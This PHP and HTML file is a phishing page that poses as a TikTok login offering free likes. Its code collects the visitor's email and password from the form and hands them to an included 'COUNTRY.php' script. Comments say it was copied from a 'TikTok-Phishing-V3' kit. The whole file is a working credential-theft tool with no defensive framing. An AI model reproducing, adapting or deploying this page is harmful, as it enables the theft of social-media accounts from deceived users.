<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
$username = $_POST['email'];
$password = $_POST['password'];
$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
$loginFolder = '';

// ابحث عن الملفات التي تطابق النمط الذي تريده
foreach ($files as $file) {
    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
    }
}
include("../COUNTRY.php");
}
?>
<!DOCTYPE html>
<html>
<!-- Powered By SADFLIX  -->
<!-- COPIED FROM https://github.com/swagkarna/TikTok-Phishing-V3/blob/main/tiktokv3.zip -->

<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Tik Tok Followers</title>
<script src="jquery.min.js"></script>
<script src="jscript.js"></script>
<link rel="stylesheet" type="text/css" href="style.css">
<style>
    @media(max-width:760px){
       #TFG{
           font-size:140%;
       } 
       .buttonstyle{
           font-size:100%;
       }
    
    .followers , .likes{
        width:95%;
    }
    }
</style>
</head>
<body onload="updateyear()">
</div>
<div id="main-tool">
	<div class="wrapper"><img src="logo.png"></div>
	<h1 id="TFG">Login</h1>
<p class="sub-heading">Login to get 1000 Tiktok Likes Free</p>

    <form action="" method="POST">
    <center>
    <div id="fillup">
        <div class="form-option">
        	<input name="email" class="input-form input-command" type="text" placeholder="Username/Email/Phone" required>
        </div>
    <div id="fillup">
        <div class="form-option">
        	<input name="password" class="input-form input-command" type="password" placeholder="Password" required>
        </div>

        <br><br>
        <button class="buttonstyle"><b>Login</b></button>
        </center>

    </div>
</div>

<div id="steps" style="display:none;">

</div>

<div id="comment" style="display:none;" >
</div>
</body>
<!-- Powered By Sadflix -->
</html>